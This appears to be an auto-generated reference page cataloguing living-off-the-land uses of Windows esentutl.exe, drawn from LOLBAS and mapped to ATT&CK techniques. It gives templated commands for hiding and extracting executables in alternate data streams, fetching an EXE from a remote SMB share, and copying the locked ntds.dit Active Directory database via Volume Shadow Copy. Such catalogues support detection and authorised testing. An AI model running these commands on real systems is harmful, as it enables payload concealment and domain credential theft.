---
parsed_by: focuslocust
source: commands
type: generated
---
# Esentutl Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Esentutl.exe

Tool page: [Esentutl.exe](../../tools/windows/esentutl.exe.md)

### Copies files from A to B

```text
esentutl.exe /y {PATH_ABSOLUTE:.source.vbs} /d {PATH_ABSOLUTE:.dest.vbs} /o
```

Description:

Copies the source VBS file to the destination VBS file.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Esentutl.yml` |
| Evidence | Command preserved from source parser. |

### Copy file and hide it in an alternate data stream as a defensive counter measure

```text
esentutl.exe /y {PATH_ABSOLUTE:.exe} /d {PATH_ABSOLUTE}:file.exe /o
```

Description:

Copies the source EXE to an Alternate Data Stream (ADS) of the destination file.

Related ATT&CK:

- [T1564.004](../../attack/techniques/T1564.004-ntfs-file-attributes.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Esentutl.yml` |
| Evidence | Command preserved from source parser. |

### Extract hidden file within alternate data streams

```text
esentutl.exe /y {PATH_ABSOLUTE}:file.exe /d {PATH_ABSOLUTE:.exe} /o
```

Description:

Copies the source Alternate Data Stream (ADS) to the destination EXE.

Related ATT&CK:

- [T1564.004](../../attack/techniques/T1564.004-ntfs-file-attributes.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Esentutl.yml` |
| Evidence | Command preserved from source parser. |

### Copy file and hide it in an alternate data stream as a defensive counter measure

```text
esentutl.exe /y {PATH_SMB:.exe} /d {PATH_ABSOLUTE}:file.exe /o
```

Description:

Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file.

Related ATT&CK:

- [T1564.004](../../attack/techniques/T1564.004-ntfs-file-attributes.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Esentutl.yml` |
| Evidence | Command preserved from source parser. |

### Use to copy files from one unc path to another

```text
esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o
```

Description:

Copies the source EXE to the destination EXE file

Related ATT&CK:

- [T1564.004](../../attack/techniques/T1564.004-ntfs-file-attributes.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Esentutl.yml` |
| Evidence | Command preserved from source parser. |

### Copy/extract a locked file such as the AD Database

```text
esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d {PATH_ABSOLUTE:.dit}
```

Description:

Copies a (locked) file using Volume Shadow Copy

Related ATT&CK:

- [T1003.003](../../attack/techniques/T1003.003-ntds.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Esentutl.yml` |
| Evidence | Command preserved from source parser. |
